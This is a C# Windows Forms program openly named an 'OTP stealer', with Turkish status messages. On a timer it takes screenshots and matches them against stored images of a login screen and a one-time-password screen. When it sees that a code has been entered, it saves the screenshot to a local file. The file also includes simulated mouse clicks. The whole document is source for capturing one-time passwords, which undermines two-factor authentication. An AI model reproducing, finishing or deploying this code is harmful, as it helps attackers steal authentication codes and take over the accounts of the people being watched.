using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing.Imaging;
using System.Diagnostics;


namespace Otp_Stealer
{
    public partial class frmMain : Form
    {
        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData,
          int dwExtraInfo);

        public enum MouseEventFlags : uint
        {
            LEFTDOWN = 0x00000002,
            LEFTUP = 0x00000004,
            MIDDLEDOWN = 0x00000020,
            MIDDLEUP = 0x00000040,
            MOVE = 0x00000001,
            ABSOLUTE = 0x00008000,
            RIGHTDOWN = 0x00000008,
            RIGHTUP = 0x00000010,
            WHEEL = 0x00000800,
            XDOWN = 0x00000080,
            XUP = 0x00000100
        }

        public frmMain()
        {
            InitializeComponent();
        }

        private void btnLogin_Click(object sender, EventArgs e)
        {
            tmrSystem.Enabled = true;

        }

        /// <summary>
        /// Simulates a mouse click
        /// </summary>
        private void MouseClik()
        {
            mouse_event((uint)MouseEventFlags.LEFTDOWN, 0, 0, 0, 0);
            Thread.Sleep((new Random()).Next(20, 30));
            mouse_event((uint)MouseEventFlags.LEFTUP, 0, 0, 0, 0);
            mouse_event((uint)MouseEventFlags.LEFTDOWN, 0, 0, 0, 0);
            Thread.Sleep((new Random()).Next(20, 30));
            mouse_event((uint)MouseEventFlags.LEFTUP, 0, 0, 0, 0);
        }

        /// <summary>
        /// Takes a snapshot of the screen
        /// </summary>
        /// <returns>A snapshot of the screen</returns>
        private Bitmap Screenshot()
        {



            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width / 3, Screen.PrimaryScreen.Bounds.Height / 2, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.Height/2, 200, 0, 0, captureRectangle.Size);
            
            //captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);    orjinal




            // return the screenshot
            return captureBitmap;
        }

        /// <summary>
        /// Find the location of a bitmap within another bitmap and return if it was successfully found
        /// </summary>
        /// <param name="bmpNeedle">The image we want to find</param>
        /// <param name="bmpHaystack">Where we want to search for the image</param>
        /// <param name="location">Where we found the image</param>
        /// <returns>If the bmpNeedle was found successfully</returns>
        private bool FindBitmap(Bitmap bmpNeedle, Bitmap bmpHaystack, out Point location)
        {
            for (int outerX = 0; outerX < bmpHaystack.Width - bmpNeedle.Width; outerX++)
            {
                for (int outerY = 0; outerY < bmpHaystack.Height - bmpNeedle.Height; outerY++)
                {
                    for (int innerX = 0; innerX < bmpNeedle.Width; innerX++)
                    {
                        for (int innerY = 0; innerY < bmpNeedle.Height; innerY++)
                        {
                            Color cNeedle = bmpNeedle.GetPixel(innerX, innerY);
                            Color cHaystack = bmpHaystack.GetPixel(innerX + outerX, innerY + outerY);

                            if (cNeedle.R != cHaystack.R || cNeedle.G != cHaystack.G || cNeedle.B != cHaystack.B)
                            {
                                goto notFound;
                            }
                        }
                    }
                    location = new Point(outerX, outerY);
                    return true;
                    notFound:
                    continue;
                }
            }
            location = Point.Empty;
            return false;
        }

        private void tmrSystem_Tick(object sender, EventArgs e)
        {
            Bitmap bmpScreenshot = Screenshot();
            Point location;

            this.BackgroundImage = bmpScreenshot;

            bool success = FindBitmap(Properties.Resources.bmpLogin, bmpScreenshot, out location);

            if (success == true)
            {
                listIslemler.Items.Add("Login Algılandı");
                return;
            }





            bool successOTP = FindBitmap(Properties.Resources.bmpOtp, bmpScreenshot, out location);

            if (successOTP == true)
            {
                bool otpGirilmedi = FindBitmap(Properties.Resources.otpGirilmedi, bmpScreenshot, out location);

                if (otpGirilmedi == true)
                {
                    listIslemler.Items.Add("Otp Girilmedi");
                    return;
                }
                else
                {
                    bmpScreenshot.Save(Application.StartupPath + "\\Otp.bmp");


                    listIslemler.Items.Add("Otp Girildi");
                    return;
                }
                
            }









            //Cursor.Position = location;
        }

    }
}
